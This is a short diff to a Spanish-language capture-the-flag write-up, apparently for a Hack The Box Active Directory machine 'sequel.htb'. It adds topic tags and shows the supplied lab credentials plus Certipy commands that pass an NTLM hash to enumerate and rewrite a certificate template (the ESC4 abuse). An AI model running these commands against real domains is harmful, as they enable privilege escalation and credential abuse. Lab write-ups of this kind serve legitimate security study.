@@ -1,3 +1,5 @@
+#AD #MSSQL #ShadowCredentials #ESC4 
+
 Antes de empezar la maquina se nos sumistran unas credenciales
 ```ad-info
  rose::KxEPkKe6R8su
@@ -325,6 +327,7 @@ certipy find -u 'ca_svc@sequel.htb' -hashes aad3b435b51404eeaad3b435b51404ee:3b1
 ```
 
 ### Abusing ESC4
+
 Usamos la versión de Certipy 5.0.4
 ```shell
 certipy template -dc-ip 10.129.232.128 -u ca_svc -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target sequel.htb -write-default-configuration
